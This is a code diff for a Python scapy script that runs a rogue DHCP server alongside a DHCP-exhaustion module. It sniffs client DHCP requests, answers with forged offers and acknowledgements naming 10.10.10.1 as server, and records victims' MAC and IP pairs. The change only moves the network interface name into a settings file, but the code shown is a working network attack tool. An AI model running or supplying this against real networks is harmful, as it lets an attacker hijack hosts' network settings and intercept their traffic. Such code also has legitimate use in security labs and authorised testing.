@@ -4,8 +4,7 @@ from scapy.all import *
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP
 import dhcp_exhaust
 import ipaddress
-
-source_interface = "Ethernet"
+import settings
 
 rogue_serv = "10.10.10.1"
 broadcast_address = "10.10.10.255"
@@ -33,7 +32,7 @@ def process(p):
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'offer'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
                         ("router", router), ("subnet_mask", subnet_mask), ('end')])
-            sendp(dhcp_offer, iface=source_interface, verbose=0)
+            sendp(dhcp_offer, iface=settings.source_interface, verbose=0)
             print( " -> Offer sent")
         elif p["DHCP"].options[0][1] == 3:
             print("Request received")
@@ -43,7 +42,7 @@ def process(p):
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'ack'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
                         ("router", router), ("subnet_mask", subnet_mask), ('end')])
-            sendp(dhcp_ack, iface=source_interface, verbose=0)
+            sendp(dhcp_ack, iface=settings.source_interface, verbose=0)
             database.append((p["Ether"].src,str(ip)))
             database = list(set(database)) # removing duplicates :)
             print( " -> Ack sent")
@@ -53,7 +52,7 @@ def process(p):
 print()
 print("SNIFFING")
 try:
-    offer = sniff(filter="src host 0.0.0.0 and port 68 and port 67", iface=source_interface, prn=process)
+    offer = sniff(filter="src host 0.0.0.0 and port 68 and port 67", iface=settings.source_interface, prn=process)
 except KeyboardInterrupt:
     print("Database")
     print(database)
